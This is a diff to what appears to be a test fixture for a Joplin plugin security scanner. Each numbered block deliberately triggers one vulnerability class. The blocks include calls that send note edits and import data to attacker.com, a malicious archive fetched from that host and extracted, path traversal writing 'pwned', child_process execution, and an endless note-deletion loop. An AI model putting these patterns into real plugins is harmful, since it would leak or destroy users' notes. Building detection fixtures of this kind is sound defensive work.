@@ -64,7 +64,8 @@ async function triggerAllVulnerabilities() {
 
     // 11. Remote Webview Scripts (joplin.views.panels.setHtml -> script src)
     const panel = await joplin.views.panels.create('panel1');
-    await joplin.views.panels.setHtml(panel, '<script src="http://attacker.com/hook.js"></script>');
+    const htmlContent = `<iframe src="https://example.com/remote_app"></iframe>`;
+    await joplin.views.panels.setHtml(panel, htmlContent);
 
     // 12. Sync Smuggling (joplin.data.get -> userDataSet)
     const smugData = await joplin.data.get(['notes']);
@@ -85,31 +86,42 @@ async function triggerAllVulnerabilities() {
         joplin.data.put(['notes', '1'], null, { body: 'sabotaged' });
     });
 
-    // 16. Resource Exhaustion (setInterval -> joplin.data.post(['resources']))
+    // 14b. Resource Exhaustion (triggers Tag Flooding logic via 'resources')
     setInterval(() => {
         joplin.data.post(['resources'], null, { id: 'spam' });
     }, 1000);
 
-    // 17. Electron Main Process Takeover
+    // 16. Electron Main Process Takeover
     require('@electron/remote').app.quit();
 
-    // 18. Archive Extraction Attack
-    await joplin.fs.archiveExtract('malicious.zip', '/dest');
+    // 17. Archive Extraction Attack (Network -> archiveExtract arg 0)
+    const maliciousZip = await fetch('http://attacker.com/zip');
+    await joplin.fs.archiveExtract(maliciousZip, '/dest');
 
-    // 19. Mass Data Destruction (loop -> joplin.data.delete)
+    // 17b. Unsafe Archive Extraction Destination (dest not from dataDir)
+    await joplin.fs.archiveExtract('safe.zip', '/dest2');
+
+    // 17c. Archive Entry Traversal (archiveExtract name -> fs operation)
+    const entries = await joplin.fs.archiveExtract('safe.zip', await joplin.plugins.dataDir());
+    fsNative.writeFileSync(entries[0].name, 'pwned');
+
+    // 17d. Third-Party Archive
+    require('adm-zip');
+
+    // 18. Mass Data Destruction (loop -> joplin.data.delete)
     while (true) {
         await joplin.data.delete(['notes', '1']);
     }
 
-    // 20. Keylogging & Silent Surveillance (onNoteContentChange with fetch inside)
+    // 19. Keylogging & Silent Surveillance (onNoteContentChange with fetch inside)
     joplin.workspace.onNoteContentChange((noteEvent) => {
         fetch('http://attacker.com/?k=' + noteEvent);
     });
 
-    // 21. Native Module Imports
+    // 20. Native Module Imports
     require('child_process').exec('bypass');
 
-    // 22. Malicious Import Module
+    // 21. Malicious Import Module
     joplin.interop.registerImportModule({ onExec: (context) => { fetch('http://attacker.com/steal?data=' + context); } });
 }
 
